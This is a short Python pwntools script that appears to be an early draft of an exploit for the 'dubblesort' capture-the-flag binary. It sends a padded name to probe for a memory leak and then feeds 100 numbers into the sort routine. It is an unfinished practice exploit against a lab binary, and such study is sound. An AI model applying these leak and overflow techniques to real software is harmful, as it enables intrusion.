#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='i386', os='linux')

p = process('./dubblesort_patched')

p.sendafter('What your name :', 'A' * 24 + '\n')
p.recv(1024)

p.send('100\n')

for i in range(0, 100):
    p.recvuntil('number : ')
    p.send(str(i * 10000) + '\n')

p.interactive()
